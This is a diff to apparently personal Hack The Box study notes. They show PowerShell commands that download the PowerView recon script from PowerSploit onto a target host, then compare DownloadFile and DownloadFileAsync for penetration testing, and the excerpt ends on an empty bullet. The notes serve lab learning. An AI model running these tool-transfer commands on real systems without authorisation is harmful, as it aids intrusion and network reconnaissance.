@@ -83,3 +83,15 @@ PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>
 PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1') 
 PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>') PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
 ```
+
+#### Which is used in penetration testing?
+
+- **`DownloadFile()`**
+    - Simpler.
+    - Most common in HTB labs and CTFs.
+    - Good when you need the file before continuing.
+- **`DownloadFileAsync()`**
+    - Useful if the download is large or slow.
+    - Lets you continue executing other commands while the file downloads.
+    - Can make long-running downloads less disruptive.
+- 
